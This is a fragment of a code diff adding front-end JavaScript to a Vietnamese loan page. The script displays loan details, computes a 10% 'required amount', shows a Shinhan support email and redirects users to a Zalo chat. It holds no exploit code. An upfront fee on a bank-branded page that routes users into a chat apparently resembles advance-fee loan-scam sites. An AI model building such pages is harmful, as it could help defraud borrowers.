+                // If decryption fails, try parsing as plain JSON
+                data = JSON.parse(raw);
+              }
+            } catch (decryptError) {
+              // If decryption fails, try parsing as plain JSON
+              try {
+                data = JSON.parse(raw);
+              } catch (parseError) {
+                console.error('Failed to parse userData:', parseError);
+                showPlaceholderData();
+                return;
+              }
+            }
+            
+            // Map of element IDs to data keys with fallback values
+            const map = {
+              customerName: { key: 'fullName', fallback: 'Khách hàng' },
+              monthlyPaymentAmount: { key: 'monthlyPayment', fallback: '2.500.000 đ' },
+              paymentDate: { key: 'nextPaymentDate', fallback: getDefaultPaymentDate() },
+              loanAmountValue: { key: 'loanAmount', fallback: '30.000.000 VND' },
+              modalLoanAmount: { key: 'loanAmount', fallback: '30.000.000 đ' },
+              modalLoanAmount2: { key: 'loanAmount', fallback: '30.000.000 đ' }
+            };
+            
+            // Populate elements with data or fallback
+            Object.entries(map).forEach(([id, config]) => {
+              const el = document.getElementById(id);
+              if (!el) return;
+              
+              const value = data[config.key] || config.fallback;
+              
+              // Format currency for specific fields
+              if (['loanAmount', 'monthlyPayment'].includes(config.key) && value !== config.fallback) {
+                const numValue = parseFloat(value);
+                if (!isNaN(numValue)) {
+                  el.textContent = numValue.toLocaleString('vi-VN') + ' VND';
+                } else {
+                  el.textContent = config.fallback;
+                }
+              } else {
+                el.textContent = String(value);
+              }
+            });
+            
+            // Special handling for requiredAmount (10% of loan amount)
+            const loanAmount = parseFloat(data.loanAmount);
+            if (!isNaN(loanAmount)) {
+              const requiredAmount = loanAmount * 0.1;
+              const requiredAmountEl = document.getElementById('requiredAmount');
+              if (requiredAmountEl) {
+                requiredAmountEl.textContent = requiredAmount.toLocaleString('vi-VN') + ' VND';
+              }
+            } else {
+              // Use default 10% of 30M = 3M
+              const requiredAmountEl = document.getElementById('requiredAmount');
+              if (requiredAmountEl) {
+                requiredAmountEl.textContent = '3.000.000 VND';
+              }
+            }
+            
+          } catch (error) {
+            console.error('Error populating data from localStorage:', error);
+            showPlaceholderData();
+          }
+        }
+
+        // Show placeholder data when no localStorage data is available
+        function showPlaceholderData() {
+          const placeholders = {
+            customerName: 'Khách hàng',
+            monthlyPaymentAmount: '2.500.000 đ',
+            paymentDate: getDefaultPaymentDate(),
+            loanAmountValue: '30.000.000 VND',
+            modalLoanAmount: '30.000.000 đ',
+            modalLoanAmount2: '30.000.000 đ',
+            requiredAmount: '3.000.000 VND'
+          };
+          
+          Object.entries(placeholders).forEach(([id, value]) => {
+            const el = document.getElementById(id);
+            if (el) el.textContent = value;
+          });
+        }
+
+        // Get default payment date (next month)
+        function getDefaultPaymentDate() {
+          const today = new Date();
+          const nextMonth = new Date(today.setMonth(today.getMonth() + 1));
+          return nextMonth.toLocaleDateString('vi-VN');
+        }
+
+        // Expose closeZaloGuidance for inline handler
+        window.closeZaloGuidance = function () {
+          const g = qs('#zaloGuidance');
+          if (g) g.style.display = 'none';
+        };
+
+        // Setup support fallback button
+        function setupSupportFallback() {
+          const supportBtn = qs('#supportFallbackBtn');
+          if (!supportBtn) return;
+
+          supportBtn.addEventListener('click', () => {
+            // Show support options
+            const supportOptions = [
+              { method: 'tel', label: 'Gọi điện', value: '+8419005555888', icon: 'fas fa-phone' },
+              { method: 'mailto', label: 'Gửi email', value: 'support@shinhan.com.vn', icon: 'fas fa-envelope' }
+            ];
+
+            const optionsHtml = supportOptions.map(option => 
+              `<a href="${option.method}:${option.value}" class="support-option">
+                <i class="${option.icon}" aria-hidden="true"></i>
+                <span>${option.label}</span>
+              </a>`
+            ).join('');
+
+            const modalHtml = `
+              <div class="modal" id="supportModal" aria-hidden="false" aria-modal="true" role="dialog">
+                <div class="modal-overlay"></div>
+                <div class="modal-content">
+                  <div class="modal-header">
+                    <h3>Chọn phương thức liên hệ</h3>
+                    <button class="modal-close" onclick="closeSupportModal()" aria-label="Đóng cửa sổ hỗ trợ">×</button>
+                  </div>
+                  <div class="modal-body">
+                    <div class="support-options">${optionsHtml}</div>
+                  </div>
+                </div>
+              </div>
+            `;
+
+            document.body.insertAdjacentHTML('beforeend', modalHtml);
+          });
+        }
+
+        // Close support modal
+        window.closeSupportModal = function() {
+          const modal = qs('#supportModal');
+          if (modal) modal.remove();
+        };
+
+        // Track Zalo click events
+        function trackZaloClick(action) {
+          try {
+            // Simple tracking - can be extended with Google Analytics or other services
+            const trackingData = {
+              action: action,
+              timestamp: Date.now(),
+              userAgent: navigator.userAgent,
+              url: window.location.href
+            };
+            
+            // Store in localStorage for analytics
+            const existingData = JSON.parse(localStorage.getItem('zaloTracking') || '[]');
+            existingData.push(trackingData);
+            localStorage.setItem('zaloTracking', JSON.stringify(existingData.slice(-10))); // Keep last 10 events
+            
+            // Console log for debugging
+            console.log('Zalo click tracked:', action);
+          } catch (error) {
+            console.error('Tracking error:', error);
+          }
+        }
+
+        // Show redirect message
+        function showRedirectMessage() {
+          const messageHtml = `
+            <div id="redirectMessage" style="
+              position: fixed;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+              background: var(--card);
+              border: 1px solid var(--border);
+              border-radius: 16px;
+              padding: 24px;
+              box-shadow: var(--shadow);
+              z-index: 2000;
+              text-align: center;
+              max-width: 400px;
+            ">
+              <div style="margin-bottom: 16px;">
+                <i class="fas fa-spinner fa-spin" style="font-size: 24px; color: var(--brand);"></i>
+              </div>
+              <h3 style="margin: 0 0 8px; color: var(--text);">Đang chuyển hướng...</h3>
+              <p style="margin: 0; color: var(--muted);">Sẽ mở Zalo trong 2 giây</p>
+            </div>
+          `;
+          
+          document.body.insertAdjacentHTML('beforeend', messageHtml);
+          
+          // Remove message after 3 seconds
+          setTimeout(() => {
+            const message = qs('#redirectMessage');
+            if (message) message.remove();
+          }, 3000);
+        }
+
+        // Redirect to Zalo with fallback
+        function redirectToZalo() {
+          const zaloUrl = 'https://zalo.me/3932037504673339016';
+          
+          try {
+            // Try to open Zalo app first (mobile)
+            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+              // Try Zalo app deep link
+              window.location.href = `zalo://oa/3932037504673339016`;
+              
+              // Fallback to web after 1 second if app doesn't open
+              setTimeout(() => {
+                window.open(zaloUrl, '_blank', 'noopener,noreferrer');
+              }, 1000);
+            } else {
+              // Desktop - open in new tab
+              window.open(zaloUrl, '_blank', 'noopener,noreferrer');
+            }
+          } catch (error) {
+            console.error('Redirect error:', error);
+            // Ultimate fallback
+            window.open(zaloUrl, '_blank', 'noopener,noreferrer');
+          }
+        }
+
+        // Update main Zalo button to include redirect functionality
+        function setupZaloMainButton() {
+          const zaloBtn = qs('#openZaloDirectBtn');
+          if (!zaloBtn) return;
+
+          zaloBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            // Track the click
+            trackZaloClick('main_button');
+            
+            // Show confirmation modal instead of direct redirect
+            const modal = qs('#confirmationModal');
+            if (modal) {
+              modal.setAttribute('aria-hidden', 'false');
+              qs('#modalConfirmBtn', modal)?.focus();
+            } else {
+              // Fallback if modal doesn't exist
+              showRedirectMessage();
+              setTimeout(redirectToZalo, 2000);
+            }
+          });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+          setupSkipLink();
+          setupCountdown();
+          setupFAQ();
+          setupModal();
+          setupSupportFallback();
+          setupZaloMainButton();
+          populateFromLocalStorage();
+          saveProgressToLocalStorage();
+
+          // Improve font awesome decorative icons accessibility
+          qsa('.section-icon i, .security-badge i, .success-icon-main i, .contact-item i').forEach((i) => {
+            i.setAttribute('aria-hidden', 'true');
+          });
+
+          // Focus main when arriving via skip link
+          const skip = qs('.skip-link');
+          if (skip) {
+            skip.addEventListener('click', () => {
+              const main = qs('#main-content');
+              if (main) main.focus();
+            });
+          }
+        });
+      })();
+    </script>
+
+    <!-- Zalo Follow Button -->
+    <div class="zalo-follow-button" data-oaid="3932037504673339016" data-cover="no" data-article="" data-width="" data-height=""></div>
+    <script src="https://sp.zalo.me/plugins/sdk.js"></script>
+  </body>
+</html>
+
